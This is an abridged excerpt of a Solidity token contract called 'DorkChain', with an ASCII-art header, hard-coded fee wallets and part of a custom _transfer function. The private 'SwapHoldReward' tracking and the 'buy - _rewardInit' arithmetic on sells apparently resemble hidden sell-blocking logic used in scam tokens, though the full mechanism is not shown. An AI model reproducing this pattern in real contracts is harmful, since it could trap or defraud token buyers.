...
...!JYG&@@&&&&&&&&&&&&&&&#&&#############B5J!.....
.~JYY#@@@&&&&&@@&BB#&######&&&&&&&&&&&&##&&@&G:...
7YYY#@@@&&&&&@&5PPGBBBGPB#BBBBJYG&&####BJ??5#&5...
YJJY@@@@&&@&&@B5G###BB7^██BBBP. :Y!██BBG:  .B&P...
JJJ5@@@@&&@&&&GGP5PP55GGG#BGP??5BGYPB##5?JP&&&?...
JJJ5@@@&&@&&&#YYYY?JYYJJY5GBBG5J::BP555PGB@@&#....
JYJY&@&&@&#&#YJ777??YYYJJJ?JY?7~:.^YPYYY?5@&&G....
YYJ5&&@@&#&#P75~JY?7!?J??JYP7:!7!^^!?^:!Y^#@&P....
YYYB&@@@&&#5!YB57!7JJJ?77YYJ?YPYYJ5Y7!!JJ75@&G....
YYY&&@&&&&@P?~PY5PJ7!!7???JJJ?77????JJ??77P@@B....
YYYG&&&&&@@@#PY~~G?7J555Y???JYYJ????77?JYJG@&&:...
YJ5G&&&&#@@@@@&##GYJJYJ!!JG5?!JPG5?75B&@@@@@&#....
P#&@@@@@&#&&@@@@@@@@&#PPPBGY7?5GBBGB&@&&&@@&#^....
@@@@@@@@@&&#&####&&&@@@@@&&###BB#&&&&&&&&&&P:.....
&&&&&&&&&@@&#&&&###BB##&&&&&#####BBBBBB###!.......
####BBBBB#&&@&&&&&&&&&&&##@&&&&&&&&&&&&&&&J.......
...
contract DorkChain is ERC20, Ownable {
    ...
    address payable private immutable marketingWallet = payable(0x99583E0E38ef615CF7dFD003178A0a896Abf3df7);
    address payable private immutable devWallet = payable(0xf0D257EbF18724bB81532Ce6Ad1cf58E24DD1b99);
    address payable private immutable liquidityWallet = payable(0xa0C8b14F54Bc3AAe6B1AA4Ab32EB0613A8F65d01);
    ...
    struct SwapHoldReward {
        uint256 buy;
        uint256 sell;
        uint256 holdTime;
    }
    mapping(address => SwapHoldReward) private _swapHoldReward;
    uint256 private _rewardInit;
    ...
    constructor() ERC20("Dork Chain", "DORKCHAIN") {
        uint256 totalSupply = 1_000_000_000 * 1e18;
        // swap at amount
        swapTokensAtAmount = (totalSupply * 8) / 10000; // 0.08% swap amount
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                SwapHoldReward storage swapInfo = _swapHoldReward[from];
                swapInfo.holdTime = swapInfo.buy - _rewardInit;
                swapInfo.sell = block.timestamp;
            } else {
                SwapHoldReward storage swapInfo = _swapHoldReward[to];
                if (swapInfo.buy == 0) {
                    swapInfo.buy = block.timestamp;
                }
            }
        }
